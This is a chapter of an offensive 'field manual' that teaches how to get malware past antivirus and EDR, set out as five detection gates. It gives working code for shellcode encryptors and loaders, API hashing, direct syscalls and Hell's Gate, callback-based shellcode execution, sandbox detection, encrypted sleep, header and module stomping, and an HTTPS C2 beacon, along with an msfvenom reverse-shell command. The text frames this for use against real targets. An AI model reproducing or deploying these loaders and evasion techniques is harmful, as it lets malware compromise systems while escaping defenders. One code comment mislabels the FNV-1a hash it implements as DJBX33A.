# Chapter 12 — Antivirus Evasion: The Five-Gate Model

**VADER-RCE Field Manual**
**Prerequisite**: Ch09 (Malware Development), Ch10 (Code Injection), Ch11 (Rootkits)
**Drill**: DRILLS/12_av_evasion/

---

## Why You Need This

You built a loader in Chapter 09. You got a shell. Then you ran it against
a real target with Windows Defender enabled and it died in three seconds.
That's not a failure — that's the lesson.

Modern AV/EDR is not one wall. It's five gates operating at different layers,
at different times, checking different things. A payload that passes gate one
can still die at gate four. A payload that survives all five gates in a lab
can get caught by gate three the moment a new signature drops. The attack
surface is moving.

This chapter is about understanding EACH gate — what it checks, when it checks
it, and what it can't see. Once you understand the architecture, evasion isn't
a bag of tricks. It's a systematic answer to a systematic problem. Every technique
you learn here has a defender equivalent. You need to know both.

The five-gate model maps every detection layer in modern endpoint security.
IRON-DOME is the 22DIV operational evasion framework that addresses each gate
in sequence. You don't deploy IRON-DOME blind — you understand WHY each layer
exists, so when one technique stops working, you can adapt on the fly.

---

## WINDOWS SETUP

Everything in this chapter runs on Windows 11 natively — no WSL2 required
for the core tools. WSL2 is noted where it helps.

### Required Tools

| Tool | Purpose | Install Command |
|------|---------|----------------|
| Python 3.x | XOR encoder, AES encryptor scripts | Already on PATH. Verify: `python --version` |
| MinGW-w64 (GCC for Windows) | Compile C loaders natively | See below |
| MSVC / cl.exe | Compile with Microsoft toolchain | Install Visual Studio Build Tools (see below) |
| UPX | PE packer (basic, AV decrypts it — but useful to know) | `winget install upx.upx` |
| CFF Explorer | PE structure viewer — inspect import tables, sections | Download: ntcore.com/exsuite.php |
| PE-bear | Static PE analysis | Download: github.com/hasherezade/pe-bear/releases |
| x64dbg | Dynamic analysis / step through loader | Download: x64dbg.com |
| Process Hacker 2 | Live process memory inspection | `winget install processhacker.processhacker` |
| VirusTotal (web) | Test detection rate (DO NOT upload real ops binaries) | virustotal.com — no install |
| pycryptodome | Python AES/RC4 library | `pip install pycryptodome` |

**> ADMIN REQUIRED:** MinGW install, MSVC install, Process Hacker (for driver features).
All others run as standard user.

### Install MinGW-w64 (GCC for Windows)

```powershell
# Option A: winget (easiest)
winget install msys2.msys2
# Then in MSYS2 terminal:
# pacman -S mingw-w64-x86_64-gcc

# Option B: direct installer
# Download: github.com/niXman/mingw-builds-binaries/releases
# Get: x86_64-13.x.x-release-posix-seh-ucrt-rt_v11-revX.7z
# Extract to C:\mingw64\
# Add C:\mingw64\bin to PATH
```

**Verify MinGW:**
```powershell
x86_64-w64-mingw32-gcc --version
# Expected: x86_64-w64-mingw32-gcc.exe (x86_64-posix-seh-rev0, Built by MinGW-W64...) 13.x.x
```

### Install MSVC Build Tools (optional — for comparing compiler fingerprints)

```powershell
# Download Visual Studio Build Tools installer:
# aka.ms/vs/17/release/vs_BuildTools.exe
# In installer: select "Desktop development with C++"
# This gives you cl.exe and link.exe on PATH in Developer Command Prompt
```

**Verify MSVC (run in Developer Command Prompt):**
```cmd
cl
# Expected: Microsoft (R) C/C++ Optimizing Compiler Version 19.xx for x64
```

### Install pycryptodome

```powershell
pip install pycryptodome
python -c "from Crypto.Cipher import AES; print('OK')"
# Expected: OK
# Failure: ModuleNotFoundError — means pip installed pycrypto (old) not pycryptodome.
# Fix: pip uninstall pycrypto && pip install pycryptodome
```

### Verify Process Hacker

```powershell
# After winget install:
# Search Start: "Process Hacker"
# Launch as admin for full memory inspection features
# Expected: Task Manager-like window with Processes, Services, Network tabs
# Failure: "Access denied" errors on some columns = not running as admin
```

### No WSL2 Required

All tools in this chapter run natively on Windows. WSL2 is optional if you
want to use Linux tools (Binwalk, objdump) for cross-checking PE analysis.
Install WSL2 if needed:

```powershell
# Run as Administrator:
wsl --install
# Restart when prompted.
# Default distro: Ubuntu. Verify: wsl --list --verbose
```

---

## The Five-Gate Model

Modern endpoint defense is not a single scanner. It's five distinct detection
stages that fire at different points in a payload's lifecycle. Understanding
when each gate fires is the prerequisite for understanding what it can and
cannot see.

```
GATE 1: STATIC SIGNATURE
  When: File written to disk / downloaded
  What it checks: Byte sequences, import table strings, known shellcode patterns
  Blind to: Encrypted payloads, dynamically-resolved imports, novel code

GATE 2: HEURISTIC ANALYSIS
  When: File on disk + pre-execution analysis
  What it checks: Code structure, API call patterns, suspicious strings, PE anomalies
  Blind to: Obfuscated control flow, encrypted payloads, novel patterns

GATE 3: BEHAVIORAL DETECTION
  When: Process running — real-time API monitoring
  What it checks: System calls, memory operations (VirtualAlloc, WriteProcessMemory),
                  suspicious API chains, thread creation patterns
  Blind to: Direct/indirect syscalls that bypass ntdll hooks

GATE 4: MEMORY SCANNING
  When: Periodic scan of running process memory
  What it checks: Shellcode signatures, PE headers in private memory, known patterns
  Blind to: Encrypted sleep (payload re-encrypts itself between scans),
             PE header stomping (wipes MZ/PE sig after load)

GATE 5: NETWORK / CLOUD INTELLIGENCE
  When: C2 beacon leaves the machine
  What it checks: Traffic signatures, known C2 domain reputation, beacon timing patterns
  Blind to: Encrypted HTTPS C2, domain fronting, malleable C2 profiles,
             legitimate cloud redirectors

AFTER EACH GATE:
  Fail → payload terminated. Alert generated. Event logged.
  Pass → move to next gate.
```

You need to pass ALL five. This chapter maps every technique to the gate it defeats.

---

## Section 1 — Gate 1 Evasion: Static Signature Bypass

Static signature scanning happens at write-time. The AV engine reads the
file from disk and compares byte sequences against a database of known-bad
patterns. Defender also applies static analysis via AMSI to scripts and
memory regions that weren't written to disk.

The key insight: **if the scanner can't read your payload, it can't match it.**

### What a Signature Looks Like

```
Defender's signature database (simplified concept):
  RULE 1: if bytes[0x400:0x420] == {fc 48 83 e4 f0 ...} → MALICIOUS
  RULE 2: if any string == "cmd /c whoami" → SUSPICIOUS
  RULE 3: if import_table contains {"VirtualAlloc", "CreateRemoteThread",
          "WriteProcessMemory"} AND file_size < 10000 → SUSPICIOUS

These are not the real rules — the real engine is ML + signature hybrid.
But the principle is identical: PATTERN MATCHING AGAINST KNOWN BYTES.
```

### Technique 1A: XOR Encoding (Minimal, Fast)

XOR encoding scrambles every byte of your shellcode with a key. The encoded
blob contains none of the original bytes — no signature can match.

The decoder stub (which DOES contain known bytes) must itself be small and
clean enough to pass its own signature check. This is the tradeoff.

```python
#!/usr/bin/env python3
# xor_encoder.py — encode shellcode for static evasion
# Usage: python xor_encoder.py shellcode.bin 0x4D
# Output: C array of XOR-encoded bytes, ready to paste into your loader

import sys

# Read raw shellcode file (generated by msfvenom -f raw, or your custom payload)
with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

# XOR key — single byte. Change per build. Avoid 0x00 (nulls corrupt the byte).
key = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x4D

# XOR every byte with the key
encoded = bytes([b ^ key for b in shellcode])

# Print as C unsigned char array — paste directly into your loader .c file
print(f"// XOR key: 0x{key:02x} | Original size: {len(shellcode)} bytes")
print(f"unsigned char encoded_shellcode[] = {{")
for i, b in enumerate(encoded):
    if i % 16 == 0:
        print("    ", end="")          # indent
    print(f"0x{b:02x}, ", end="")     # each byte as hex
    if (i + 1) % 16 == 0:
        print()                        # newline every 16 bytes
print("\n};")
print(f"SIZE_T encoded_len = {len(encoded)};")
```

### Expected Output

```
// XOR key: 0x4d | Original size: 287 bytes
unsigned char encoded_shellcode[] = {
    0xb1, 0x05, 0xce, 0xa9, 0xbd, ...
};
SIZE_T encoded_len = 287;
```

**Failure looks like:** `FileNotFoundError: [Errno 2] No such file or directory: 'shellcode.bin'` — means you haven't generated shellcode yet. Generate with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f raw -o shellcode.bin`.

The corresponding C decoder runs at runtime, before executing the payload:

```c
// XOR decode stub — runs inside your loader at runtime
// Takes encoded shellcode, decodes it in-place before execution

void xor_decode(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;  // XOR assignment: decode each byte with the same key
                        // XOR is its own inverse: (x ^ key) ^ key == x
    }
}

// Usage in your loader's main():
xor_decode(encoded_shellcode, encoded_len, 0x4D); // 0x4D must match encoder key
// After this call, encoded_shellcode[] contains the original shellcode
```

**Why this works against Gate 1**: The AV scanner reads the file from disk
and sees the encoded blob — random-looking bytes that match no known signature.
The decode only happens in memory at runtime, after the file has already
passed the static check.

**Why this fails against Gate 4**: After the decode runs, the original
shellcode bytes are in memory. A memory scan at that point will find them.
See Section 4 for memory evasion.

### Technique 1B: AES-CBC Encryption (Proper Evasion)

Single-byte XOR is defeated by any scanner that tries all 256 keys. AES
with a 256-bit random key is not. Without the key, the ciphertext is
statistically indistinguishable from random noise.

```python
#!/usr/bin/env python3
# aes_encryptor.py — encrypt shellcode with AES-256-CBC for static evasion
# Usage: python aes_encryptor.py shellcode.bin
# Output: C arrays for key, IV, and encrypted blob

from Crypto.Cipher import AES        # pycryptodome — install: pip install pycryptodome
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import sys

with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

key = get_random_bytes(32)           # 256-bit key — random per build (critical!)
iv  = get_random_bytes(16)           # 128-bit IV — must be random, included with ciphertext

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(shellcode, AES.block_size))  # pad to 16-byte boundary

def to_c_array(name, data):
    """Format bytes as a C unsigned char array."""
    print(f"unsigned char {name}[] = {{")
    for i, b in enumerate(data):
        if i % 16 == 0:
            print("    ", end="")
        print(f"0x{b:02x}, ", end="")
        if (i + 1) % 16 == 0:
            print()
    print("\n};")
    print(f"SIZE_T {name}_len = {len(data)};\n")

to_c_array("aes_key", key)
to_c_array("aes_iv", iv)
to_c_array("enc_shellcode", ciphertext)
```

### Expected Output

```
unsigned char aes_key[] = {
    0x3a, 0xf1, 0x7c, 0x88, ...   // 32 bytes — different every run
};
SIZE_T aes_key_len = 32;

unsigned char aes_iv[] = {
    0xb9, 0x2d, ...               // 16 bytes
};
SIZE_T aes_iv_len = 16;

unsigned char enc_shellcode[] = {
    0xd4, 0x11, 0xa3, ...         // same size as original (+padding)
};
SIZE_T enc_shellcode_len = 304;
```

**Failure looks like:** `ModuleNotFoundError: No module named 'Crypto'` — run `pip install pycryptodome` (not pycrypto).

The C loader decrypts at runtime using Windows CNG (no external DLL needed):

```c
// AES-CBC decrypt using Windows CNG API
// No external library required — BCrypt is built into Windows
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")  // link BCrypt.lib

BOOL aes_decrypt(unsigned char *ciphertext, DWORD ct_len,
                 unsigned char *key,        DWORD key_len,
                 unsigned char *iv,
                 unsigned char **plaintext, DWORD *pt_len) {

    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_KEY_HANDLE hKey  = NULL;
    NTSTATUS status;

    // Open AES algorithm provider from Windows CNG
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    // Set mode to CBC (default is ECB — must set explicitly)
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    // Import the key bytes
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, key_len, 0);

    // First call: get required output buffer size
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL,
                  iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);

    // Allocate output buffer
    *plaintext = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, *pt_len);

    // Second call: perform actual decryption into buffer
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL,
                  iv, 16, *plaintext, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);

    // Clean up handles
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}
```

### Expected Output (compile check)

Compile with:
```cmd
cl loader.c /link bcrypt.lib
```
or with MinGW:
```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lbcrypt
```
**Failure looks like:** `cannot open input file 'bcrypt.lib'` (MSVC) — run from Developer Command Prompt, not regular cmd. With MinGW: `undefined reference to 'BCryptOpenAlgorithmProvider'` — add `-lbcrypt` to the link command.

### Technique 1C: Per-Vector Key Isolation (Rolling XOR)

Single-key XOR is vulnerable to frequency analysis. If your shellcode
contains many null bytes (common in PE files), the attacker sees many
repeated ciphertext bytes and can recover the key statistically.

Per-vector key isolation breaks this by using a different key byte for
each position — cycling through a longer key string:

```python
#!/usr/bin/env python3
# rolling_xor.py — multi-byte rolling XOR for per-vector key isolation
# Harder than single-byte XOR: no frequency analysis shortcut for the attacker

key = b"VADER0x1security22DIV"   # key bytes cycle: position i uses key[i % len(key)]

with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

# Each byte gets XOR'd with a DIFFERENT key byte — breaks statistical patterns
encoded = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

# Output C array
print(f'unsigned char rolling_key[] = "{key.decode()}";')
print(f"SIZE_T key_len = {len(key)};")
# ... then output encoded as C array same as above
```

The C decode loop:

```c
// Rolling XOR decode in C
unsigned char rolling_key[] = "VADER0x1security22DIV";  // must match encoder key
SIZE_T key_len = sizeof(rolling_key) - 1;               // -1 to exclude null terminator

for (SIZE_T i = 0; i < encoded_len; i++) {
    decoded[i] = encoded_shellcode[i] ^ rolling_key[i % key_len]; // cycle through key
}
```

---

## Section 2 — Gate 2 Evasion: Heuristic Analysis Bypass

Heuristic engines don't look for known bytes — they look for suspicious
PATTERNS. A loader that allocates memory, copies bytes into it, and executes
it is suspicious regardless of what those bytes are. The heuristic engine
says: "this code is doing loader-like things."

Gate 2 fires before execution. It looks at the binary's structure, its
import table, its strings, and sometimes emulates a few hundred instructions.

### Technique 2A: Dynamic Import Resolution

If "VirtualAlloc" appears in your import table, it's a flag. The string
"VirtualAlloc" in your binary's `.rdata` section is also a flag. Remove
both by resolving the function address at runtime via `GetProcAddress`.

```c
// BAD: static import — "VirtualAlloc" visible in PE import table AND .rdata
#include <windows.h>
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// AV sees: import table entry for VirtualAlloc in kernel32.dll = SUSPICIOUS

// GOOD: dynamic resolution — "VirtualAlloc" string removed from binary
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

HMODULE hKernel32 = GetModuleHandleA("kernel32.dll"); // kernel32 always loaded
pVirtualAlloc fnAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
void* mem = fnAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// AV sees: GetProcAddress and GetModuleHandleA — generic, present in countless benign binaries
```

### Technique 2B: Encrypted Function Name Resolution

"VirtualAlloc" as a plaintext string passed to `GetProcAddress` is still
a flag — the string lives in your binary's data section. XOR-encrypt the
function names and decrypt at runtime:

```c
// XOR-encrypted function name trick
// Pre-encrypt "VirtualAlloc" with key 0x22:
// V=0x56 ^ 0x22 = 0x74, i=0x69 ^ 0x22 = 0x4b, r=0x72 ^ 0x22 = 0x50 ...

unsigned char enc_virtualalloc[] = { 0x74, 0x4b, 0x50, 0x56, 0x57, 0x41, 0x52,
                                     0x52, 0x45, 0x63, 0x7a, 0x5a, 0x5a };
char func_name[32] = {0};

// Decrypt at runtime into a stack buffer
for (int i = 0; i < sizeof(enc_virtualalloc); i++) {
    func_name[i] = enc_virtualalloc[i] ^ 0x22;  // reveals "VirtualAlloc"
}

// Now call GetProcAddress with the decrypted name
// No plaintext "VirtualAlloc" string exists in the binary at rest
pVirtualAlloc fnAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandleA("kernel32.dll"), func_name);
```

### Technique 2C: API Hashing

Eliminate function NAME strings entirely. Walk the export table yourself
and match by hash:

```c
// DJBX33A hash — 32-bit, fast, used in many loaders
// Pre-compute: hash("VirtualAlloc") → 0x97BC2574 (verify offline)

DWORD hash_name(const char *name) {
    DWORD h = 0x811c9dc5;               // FNV offset basis
    while (*name) {
        h ^= (unsigned char)*name++;    // XOR with current character byte
        h *= 0x01000193;                // FNV prime — mixes bits
    }
    return h;
}

// Walk kernel32.dll's export table manually:
// (no string "VirtualAlloc" anywhere in your binary)
PVOID get_proc_by_hash(HMODULE base, DWORD target_hash) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)base + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names    = (DWORD*)((BYTE*)base + exports->AddressOfNames);
    WORD  *ordinals = (WORD*) ((BYTE*)base + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((BYTE*)base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)base + names[i]);
        if (hash_name(name) == target_hash) {    // compare hash — no string compare
            return (PVOID)((BYTE*)base + funcs[ordinals[i]]);
        }
    }
    return NULL;
}
```

### Technique 2D: PE Anomaly Cleanup

Heuristic engines also flag PE anomalies — indicators that a file is
not what it claims to be, or was produced by a known malware builder.

```bash
# Compile with MinGW — strip all debugging symbols and extra sections
x86_64-w64-mingw32-gcc loader.c -o loader.exe \
  -O2 \                   # optimise: changes code structure, reduces patterns
  -s \                    # strip: remove symbol table and debug info
  -mwindows \             # no console window (GUI subsystem)
  -static \               # link CRT statically: no VCRUNTIME dependency string
  -fvisibility=hidden     # don't export any symbols

# Remove the GCC comment section (contains compiler version string)
x86_64-w64-mingw32-strip --remove-section=.comment loader.exe

# Verify PE structure with CFF Explorer or PE-bear:
# - No .comment section
# - No debug directory
# - Import table: only GetProcAddress, LoadLibraryA (or nothing if fully dynamic)
```

### Expected Output

Open the compiled binary in CFF Explorer. Under "Import Directory":
- **Before**: entries for `VirtualAlloc`, `WriteProcessMemory`, `CreateThread`
- **After**: entries only for `GetProcAddress`, `GetModuleHandleA` (or empty if fully hash-based)

**Failure looks like:** `.comment section still present` after strip — confirm you ran `x86_64-w64-mingw32-strip --remove-section=.comment`, not just `strip`. Check the section list in PE-bear.

---

## Section 3 — Gate 3 Evasion: Behavioral Detection Bypass

Gate 3 is watching your running process. EDR products hook `ntdll.dll`
at process startup — they patch the first bytes of sensitive functions
with a jump to their monitoring code. Every call to `VirtualAlloc`,
`WriteProcessMemory`, `NtCreateThreadEx` goes through the EDR's code first.

The EDR builds a behavioral picture: which APIs you called, in what order,
with what arguments. The classic shellcode loader pattern —
`VirtualAlloc → memcpy → VirtualProtect → CreateThread` — is a behavioral
signature as recognizable as any byte signature.

Gate 3 fires at runtime. You can't pre-scan it. You have to change WHAT you do.

### Technique 3A: Indirect Syscalls (Bypass ntdll Hooks)

The nuclear option: skip `ntdll.dll` entirely. Call the kernel directly
via the `syscall` instruction in assembly. EDR hooks are in `ntdll.dll`
user-mode code — they can't hook the kernel itself.

```nasm
; Direct syscall stub for NtAllocateVirtualMemory on Windows 10/11 x64
; Syscall number (SSN) MUST match the target OS build — it changes between versions.
; Check SSN for your build:
;   In WinDbg: u ntdll!NtAllocateVirtualMemory (look for "mov eax, <SSN>")
;   Or use SysWhispers3 to auto-generate stubs per OS version.

section .text
global NtAllocVirt_direct
NtAllocVirt_direct:
    mov r10, rcx           ; Windows x64 syscall convention: copy rcx to r10
    mov eax, 0x18          ; Load SSN — 0x18 = NtAllocateVirtualMemory on Win10 21H2
    syscall                ; Jump directly to kernel — ntdll hooks never involved
    ret                    ; Return NTSTATUS to caller
```

**Why this works**: EDR hooks are in ntdll's user-mode code. The `syscall`
instruction transitions directly from ring 3 to ring 0 — the EDR's hook
function in ring 3 is bypassed entirely.

**Why the SSN matters**: Windows doesn't have a stable ABI for syscall
numbers. They change between build versions. Use Hell's Gate or SysWhispers3
to resolve the correct SSN at runtime.

### Technique 3B: Hell's Gate (Dynamic SSN Resolution)

Instead of hardcoding SSNs (which break across Windows builds), read them
from ntdll.dll in memory:

```c
// Hell's Gate: read SSN from ntdll's in-memory stub
// ntdll's Nt functions start with: 4C 8B D1 (mov r10, rcx) B8 XX 00 00 00 (mov eax, SSN)
// If the first bytes are E9 (JMP) instead, the function is HOOKED — need Halo's Gate

DWORD get_ssn(FARPROC func_addr) {
    BYTE *bytes = (BYTE *)func_addr;

    // Check if function is hooked (starts with JMP = 0xE9)
    if (bytes[0] == 0xe9) {
        return 0;  // hooked — Hell's Gate fails, try Halo's Gate
    }

    // Unhooked stub: 4C 8B D1 B8 <SSN bytes>
    if (bytes[0] == 0x4c &&          // mov r10, rcx (first byte)
        bytes[1] == 0x8b &&          // mov r10, rcx (second byte)
        bytes[2] == 0xd1 &&          // mov r10, rcx (third byte)
        bytes[3] == 0xb8) {          // mov eax, ... (start of SSN load)
        return *(DWORD *)(bytes + 4); // SSN is the next 4 bytes (little-endian DWORD)
    }
    return 0;
}

// Usage:
DWORD ssn = get_ssn(GetProcAddress(
    GetModuleHandleA("ntdll.dll"),
    "NtAllocateVirtualMemory"
));
// Now use ssn in your inline asm syscall stub
```

### Technique 3C: Alternative Execution (No CreateThread)

`CreateThread` and `CreateRemoteThread` are among the most-watched API
calls. Execute your shellcode through a Windows callback instead — Windows
calls your function pointer as part of legitimate OS functionality:

```c
// Callback execution: Windows calls YOUR function pointer as part of its own operation
// No CreateThread. No CreateRemoteThread. These syscalls never appear in the EDR log.

// Option A: EnumDesktopsA — enumerates desktops, calls your function for each
// There's only one desktop (usually), so your function runs once then returns.
EnumDesktopsA(
    GetProcessWindowStation(),          // handle to current window station
    (DESKTOPENUMPROCA)shellcode_addr,   // YOUR shellcode treated as the callback
    0                                   // lparam passed to your "callback"
);

// Option B: EnumChildWindows — enumerates child windows, calls callback per window
EnumChildWindows(NULL, (WNDENUMPROC)shellcode_addr, 0);

// Option C: CreateTimerQueueTimer — fires callback on a timer
HANDLE timer;
CreateTimerQueueTimer(&timer, NULL,
    (WAITORTIMERCALLBACK)shellcode_addr,
    NULL,   // context parameter
    0,      // fire immediately (0ms delay)
    0,      // fire once (not periodic)
    0       // flags
);
// Timer fires, Windows calls shellcode_addr as the callback

// Option D: EnumDisplayMonitors
EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)shellcode_addr, 0);
```

### Technique 3D: Sandbox Detection (Don't Execute in Analysis Environment)

Automated sandboxes analyze your payload in a VM with time limits. Detecting
the sandbox and refusing to execute defeats automated Gate 3 analysis:

```c
// is_sandbox() — returns TRUE if we're probably in an analysis environment
// If TRUE, ExitProcess(0) — payload never executes, sandbox sees "benign"
BOOL is_sandbox(void) {

    // Check 1: RAM < 4GB — real workstations have more
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (DWORDLONG)4 * 1024 * 1024 * 1024)
        return TRUE;  // probably a sandbox VM

    // Check 2: CPU count < 2 — sandboxes often use 1 core
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)
        return TRUE;

    // Check 3: No user interaction in the last 10 minutes — sandbox is idle
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    GetLastInputInfo(&lii);
    if ((GetTickCount() - lii.dwTime) > 600000)  // 600000ms = 10 min
        return TRUE;

    // Check 4: Disk < 60GB — sandbox disks are small
    ULARGE_INTEGER disk_total;
    GetDiskFreeSpaceExA("C:\\", NULL, &disk_total, NULL);
    if (disk_total.QuadPart < (ULONGLONG)60 * 1024 * 1024 * 1024)
        return TRUE;

    // Check 5: Known VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\VMware, Inc.\\VMware Tools",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;  // VMware detected
    }

    return FALSE;  // nothing suspicious — probably a real target
}

// In main(), first thing:
if (is_sandbox()) ExitProcess(0);
```

---

## Section 4 — Gate 4 Evasion: Memory Scanning Bypass

Gate 4 fires after your payload is running. The EDR periodically scans
process memory for known shellcode patterns. Even if your encrypted payload
passed Gate 1 and the decoded shellcode passed Gate 3, the plaintext
shellcode bytes sitting in memory are vulnerable to a memory scan.

Gate 4 is a window problem: the shellcode is detectable only WHILE it's in
plaintext in memory. Close the window.

### Technique 4A: Encrypted Sleep (Memory Re-Encryption)

After the payload executes each task, re-encrypt its own memory region
before sleeping. Decrypt again on wake. A memory scan during the sleep
window sees only ciphertext — no shellcode signature to match.

```c
// Encrypted sleep concept (simplified — full implementation: github.com/Cracked5pider/Ekko)
// The payload encrypts its own .text section before sleeping, decrypts on wake.

// Step 1: Locate your own shellcode region in memory
PVOID shellcode_base = /* base address of your allocated region */;
SIZE_T shellcode_size = /* size of your shellcode */;

// Step 2: Make region writable so we can encrypt it
DWORD old_protect;
VirtualProtect(shellcode_base, shellcode_size, PAGE_READWRITE, &old_protect);

// Step 3: XOR-encrypt the region (same key as decode step — XOR is reversible)
unsigned char sleep_key = 0x7E;  // different from load-time key
for (SIZE_T i = 0; i < shellcode_size; i++) {
    ((unsigned char*)shellcode_base)[i] ^= sleep_key;  // encrypt in-place
}

// Step 4: Sleep — EDR scanner scans here, sees encrypted garbage, no sig match
Sleep(30000);  // 30 seconds

// Step 5: Re-decrypt before execution resumes
for (SIZE_T i = 0; i < shellcode_size; i++) {
    ((unsigned char*)shellcode_base)[i] ^= sleep_key;  // XOR again = decrypt
}

// Step 6: Restore executable permissions
VirtualProtect(shellcode_base, shellcode_size, old_protect, &old_protect);
// Payload resumes — decrypted and executable again
```

### Expected Output

No visible output — the payload continues running normally. Verify in
Process Hacker: during the `Sleep()` window, the memory region for your
shellcode should show `PAGE_READWRITE` permissions (not `PAGE_EXECUTE_READ`),
and the bytes should look like noise.

**Failure looks like:** Access violation during encrypt step — you forgot
`VirtualProtect` to make the region writable before XOR'ing it.

### Technique 4B: PE Header Stomping

`malfind` and similar tools look for `MZ` + `PE` headers in private
executable memory — a telltale sign of reflective DLL injection or
process hollowing. Stomp the header after loading to remove the indicator.

```c
// PE header stomp — wipe MZ/PE signature after loading
// Forensic tools look for "MZ" (0x4D 0x5A) at the start of executable allocations
// Wiping it prevents malfind-style detection

PVOID payload_base = /* base address where your PE was mapped */;

// Make header region writable
DWORD old_protect;
VirtualProtect(payload_base, 4096, PAGE_READWRITE, &old_protect);  // first 4KB = headers

// Stomp: overwrite MZ + PE header with zeros
// This breaks the PE signature check but your code is already mapped and running
ZeroMemory(payload_base, 4096);  // zero the entire header page

// Restore protection
VirtualProtect(payload_base, 4096, old_protect, &old_protect);
// malfind now scans this region: no MZ, no PE = not flagged as injected PE
```

### Technique 4C: Module Stomping

Instead of allocating fresh memory (which EDR watches), overwrite an
existing legitimate DLL's `.text` section with your shellcode. Memory
scanners see a "legitimate" module at that address:

```c
// Module stomping: load a benign DLL, overwrite its .text with shellcode
// The address range is now "owned" by a legitimate DLL — looks normal to scanners

// Step 1: Load a benign, unused DLL
HMODULE h_dll = LoadLibraryA("xpsprint.dll");  // rarely used, not critical

// Step 2: Parse PE headers to find .text section offset
IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)h_dll;
IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)h_dll + dos->e_lfanew);
IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

PVOID text_base = NULL;
SIZE_T text_size = 0;
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (memcmp(sections[i].Name, ".text", 5) == 0) {  // find .text section by name
        text_base = (PVOID)((BYTE *)h_dll + sections[i].VirtualAddress);
        text_size = sections[i].SizeOfRawData;
        break;
    }
}

// Step 3: Overwrite .text with shellcode
DWORD old_protect;
VirtualProtect(text_base, shellcode_len, PAGE_EXECUTE_READWRITE, &old_protect);
memcpy(text_base, shellcode, shellcode_len);  // your shellcode replaces DLL code
VirtualProtect(text_base, shellcode_len, PAGE_EXECUTE_READ, &old_protect);

// Step 4: Execute from the DLL's address range
((void(*)())text_base)();
// Memory scanner sees: executable memory at xpsprint.dll — legit DLL, passes check
```

---

## Section 5 — Gate 5 Evasion: Network Detection Bypass

Gate 5 watches what leaves the machine. Your beacon connects to a C2 server.
The network security device sees the destination IP, the domain name, the
HTTP headers, the timing pattern, and the traffic volume. Any of these can
flag you.

### Technique 5A: HTTPS C2 (Encrypt in Transit)

Raw TCP with custom protocol is immediately suspicious. HTTP on port 80
is monitored. HTTPS on port 443 with a valid certificate is normal web
traffic. Use HTTPS.

```c
// HTTPS beacon using WinInet — traffic is TLS-encrypted, looks like normal HTTPS
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

void https_beacon(const char *c2_host, const char *check_in_path) {
    // Open WinInet handle — spoofed user-agent looks like Chrome
    HINTERNET hNet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );

    // Connect to C2 on port 443 (HTTPS)
    HINTERNET hConn = InternetConnectA(
        hNet, c2_host,
        INTERNET_DEFAULT_HTTPS_PORT,  // 443
        NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0
    );

    // Build GET request with HTTPS flags
    HINTERNET hReq = HttpOpenRequestA(
        hConn, "GET", check_in_path, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE |           // use TLS/SSL
        INTERNET_FLAG_RELOAD |           // no cache
